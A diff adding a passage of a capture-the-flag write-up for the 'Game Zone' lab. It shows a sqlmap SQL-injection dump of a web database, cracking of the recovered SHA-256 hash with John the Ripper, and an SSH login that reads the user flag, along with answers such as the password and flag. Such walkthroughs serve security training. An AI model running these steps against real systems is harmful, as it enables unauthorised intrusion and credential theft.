@@ -62,3 +62,111 @@ Answer: portal.php
   - Acknowledge Yes for further testing, and storing hashes in temporary file.
   - Use the default dictionary for wordlists.tx_.
   - Use common password suffixes y (its slow but gets it done).
+
+SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.
+
+```
+┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF]
+└─$ sqlmap -r /mnt/CTF/Game_Zone/request.txt --dbms=mysql --dump
+        ___
+       __H__                                                                                        ___ ___[,]_____ ___ ___  {1.9.8#stable}                                                           |_ -| . [']     | .'| . |                                                                          
+|___|_  ["]_|_|_|__,|  _|                                                                          
+      |_|V...       |_|   https://sqlmap.org                                                                                 
+...
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+...
+...
+POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+...
+Database: db
+Table: post
+[5 entries]
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | name                           | description                                                                                                                                                                                            |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
+| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
+| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
+| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
+| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+[03:13:03] [INFO] table 'db.post' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157/dump/db/post.csv'                      ...
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[03:13:14] [INFO] writing hashes to a temporary file '/tmp/sqlmapkoglbk6r247838/sqlmaphashes-tz21s7dm.txt' 
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[03:13:22] [INFO] using hash method 'sha256_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[03:13:35] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] n
+...                         
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
+
+[03:15:09] [INFO] table 'db.users' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157/dump/db/users.csv'                                                                                                                      
+[03:15:09] [INFO] fetched data logged to text files under '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157'
+[03:15:09] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 03:15:09 /2026-04-26/
+```
+## Q1 In the users table, what is the hashed password?
+Answer: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+
+## Q2 What was the username associated with the hashed password?
+Answer: agent47
+
+## Q3 What was the other table name?
+Answer: POST
+
+# Task4 Cracking a password with JohnTheRipper
+Here we already have the hash and aparently its a sha256
+
+john --format=raw-sha256 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+hash.txt - contains a list of your hashes (in your case its just 1 hash)
+--wordlist - is the wordlist you're using to find the dehashed value
+--format - is the hashing algorithm used. In our case its hashed using SHA256.
+
+
+## Q1 What is the de-hashed password?
+Answer: videogamer124
+
+## Q2 Now you have a password and username. Try SSH'ing onto the machine. What is the user flag?
+```
+$ ssh agent47@10.49.166.157                                            
+The authenticity of host '10.49.166.157 (10.49.166.157)' can't be established.
+ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.49.166.157' (ED25519) to the list of known hosts.
+agent47@10.49.166.157's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
+agent47@gamezone:~$ ls
+user.txt
+agent47@gamezone:~$ cat user.txt
+649ac17b1480ac13ef1e4fa579dac95c
+agent47@gamezone:~$ exit
+logout
+Connection to 10.49.166.157 closed.
+```
+Answer: 649ac17b1480ac13ef1e4fa579dac95c
